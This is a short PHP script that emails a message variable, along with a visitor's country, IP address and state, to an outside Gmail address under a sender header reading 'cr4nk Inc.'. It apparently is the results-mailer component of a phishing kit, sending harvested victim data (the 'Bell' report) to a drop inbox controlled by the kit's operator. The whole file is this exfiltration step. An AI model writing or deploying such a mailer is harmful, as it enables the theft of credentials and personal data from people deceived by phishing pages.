<?php

$to = "xxkingbaduxx@gmail.com";
$subject = "Bell Rport $country |$ip| $state";
$from = "From: cr4nk Inc.<newidea@malancellc.com>";

mail($to,$subject,$msg,$from);

?>